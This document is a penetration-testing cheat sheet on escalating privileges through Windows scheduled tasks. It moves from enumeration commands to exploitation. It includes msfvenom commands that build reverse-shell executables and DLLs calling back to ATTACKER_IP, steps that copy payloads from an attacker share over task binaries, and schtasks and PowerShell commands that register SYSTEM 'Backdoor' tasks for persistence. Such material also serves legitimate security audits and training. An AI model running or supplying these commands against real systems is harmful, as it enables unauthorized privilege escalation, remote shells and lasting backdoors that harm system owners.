# Windows Scheduled Tasks Privilege Escalation

## Enumerating Scheduled Tasks

### Using schtasks

```cmd
# List all tasks with details
schtasks /query /fo LIST /v

# List tasks in table format
schtasks /query /fo TABLE

# Get specific task
schtasks /query /tn "TaskName" /fo LIST /v

# List tasks running as SYSTEM
schtasks /query /fo LIST /v | findstr /i "SYSTEM"

# Find tasks running as SYSTEM with their paths
schtasks /query /fo LIST /v | findstr /B /C:"TaskName" /C:"Run As User" /C:"Task To Run"
```

### Using PowerShell

```powershell
# Get all scheduled tasks
Get-ScheduledTask | Format-Table TaskName, State, TaskPath

# Get detailed info
Get-ScheduledTask | Get-ScheduledTaskInfo

# Filter for enabled tasks
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Format-Table TaskName, TaskPath, State

# Get tasks running as SYSTEM
Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"} | Format-Table TaskName, TaskPath

# Get task actions (what they run)
Get-ScheduledTask | ForEach-Object { 
    $task = $_
    $task.Actions | ForEach-Object {
        [PSCustomObject]@{
            TaskName = $task.TaskName
            Execute = $_.Execute
            Arguments = $_.Arguments
        }
    }
}
```

### Using Accesschk

```cmd
# Check permissions on scheduled task folders
accesschk.exe /accepteula -dqv "C:\Windows\System32\Tasks"
accesschk.exe /accepteula -wvu "C:\Windows\System32\Tasks\*"
```

---

## Finding Vulnerable Tasks

### Check 1: Writable Task Binary

```cmd
# List task binaries
schtasks /query /fo LIST /v | findstr "Task To Run"

# Check permissions on each binary
icacls "C:\Path\To\TaskBinary.exe"
```

Look for:
- `BUILTIN\Users:(M)` - Modify
- `BUILTIN\Users:(W)` - Write  
- `BUILTIN\Users:(F)` - Full Control
- `Everyone:(W)` or `Everyone:(M)`

### Check 2: Writable Task Directory

```cmd
# If binary path has spaces and directory is writable
icacls "C:\Program Files\Company Name"
# Can potentially create executable earlier in path
```

### Check 3: Missing Binary

```cmd
# Task runs binary that doesn't exist
# Check task path
schtasks /query /tn "TaskName" /fo LIST /v
# Verify binary exists
dir "C:\Path\To\Binary.exe"
```

### Check 4: Using WinPEAS

```cmd
winPEASx64.exe quiet applicationsinfo
```

### Check 5: Using PowerUp

```powershell
. .\PowerUp.ps1
Get-ModifiableScheduledTaskFile
```

---

## Exploitation Techniques

### Technique 1: Replace Task Binary

If you can write to the task's executable:

```cmd
# 1. Identify vulnerable task
schtasks /query /fo LIST /v | findstr "Task To Run"
# Task runs: C:\Scripts\backup.exe

# 2. Check permissions
icacls "C:\Scripts\backup.exe"
# Shows writable by current user

# 3. Generate payload
# On attacker:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > backup.exe

# 4. Replace binary
move C:\Scripts\backup.exe C:\Scripts\backup.exe.bak
copy \\ATTACKER_IP\share\backup.exe C:\Scripts\backup.exe

# 5. Wait for task to run or trigger it
schtasks /run /tn "TaskName"
```

### Technique 2: Create Binary in Writable Directory

If task directory is writable but binary isn't:

```cmd
# If task runs: C:\Scripts\backup.exe
# And C:\Scripts is writable

# Create malicious DLL if binary loads DLLs
# Or if path has spaces and folders are writable
```

### Technique 3: DLL Hijacking

If scheduled task binary loads DLLs:

```cmd
# 1. Identify DLLs loaded by task binary
# Use Process Monitor or:
listdlls.exe "C:\Path\To\TaskBinary.exe"

# 2. Check DLL search path
# Windows searches: Application dir → System32 → System → Windows → Current dir → PATH

# 3. Create malicious DLL in writable location
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll > evil.dll

# 4. Place in writable search location
copy evil.dll "C:\Path\To\Task\Directory\targetdll.dll"
```

### Technique 4: Missing Binary

If task references non-existent binary:

```cmd
# 1. Find task with missing binary
schtasks /query /fo LIST /v | findstr "Task To Run"
# Task runs: C:\OldApp\service.exe (doesn't exist)

# 2. Check if you can create the path
icacls "C:\OldApp"
# If doesn't exist, check parent
icacls "C:\"

# 3. Create directory and binary
mkdir C:\OldApp
copy \\ATTACKER_IP\share\shell.exe C:\OldApp\service.exe

# 4. Wait for task or trigger
```

---

## Task Triggers

### Common Triggers to Watch For

| Trigger | Likelihood of Exploitation |
|---------|---------------------------|
| At startup | Good - reboot triggers |
| At log on | Good - log off/on triggers |
| On idle | Moderate - wait for idle |
| Daily/Weekly | Must wait or reschedule |
| On event | Depends on event |

### Manually Trigger Task

```cmd
# If you have permissions
schtasks /run /tn "TaskName"

# Or via PowerShell
Start-ScheduledTask -TaskName "TaskName"
```

---

## Creating Malicious Task (Post-Exploitation)

Once you have elevated privileges:

```cmd
# Create task running as SYSTEM
schtasks /create /tn "Backdoor" /tr "C:\Windows\Temp\shell.exe" /sc onstart /ru SYSTEM

# Create task running at logon
schtasks /create /tn "Backdoor" /tr "C:\Windows\Temp\shell.exe" /sc onlogon /ru SYSTEM

# Create task running every minute
schtasks /create /tn "Backdoor" /tr "C:\Windows\Temp\shell.exe" /sc minute /mo 1 /ru SYSTEM
```

```powershell
# PowerShell
$action = New-ScheduledTaskAction -Execute "C:\Windows\Temp\shell.exe"
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask -TaskName "Backdoor" -Action $action -Trigger $trigger -Principal $principal
```

---

## XML Task File Analysis

Tasks are stored as XML files in:
```
C:\Windows\System32\Tasks\
```

### Reading Task XML

```cmd
type "C:\Windows\System32\Tasks\TaskName"
```

### Key XML Elements

```xml
<Task>
  <Principals>
    <Principal>
      <UserId>S-1-5-18</UserId>  <!-- SYSTEM SID -->
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Actions>
    <Exec>
      <Command>C:\Path\To\Binary.exe</Command>
      <Arguments>--args</Arguments>
    </Exec>
  </Actions>
  <Triggers>
    <CalendarTrigger>
      <!-- Schedule info -->
    </CalendarTrigger>
  </Triggers>
</Task>
```

---

## Quick Checklist

1. [ ] Enumerate all scheduled tasks
2. [ ] Identify tasks running as SYSTEM/Admin
3. [ ] Check permissions on task binaries
4. [ ] Check permissions on task directories
5. [ ] Look for missing binaries
6. [ ] Check for DLL hijacking opportunities
7. [ ] Review task triggers for exploitation timing
8. [ ] Test with PowerUp's Get-ModifiableScheduledTaskFile



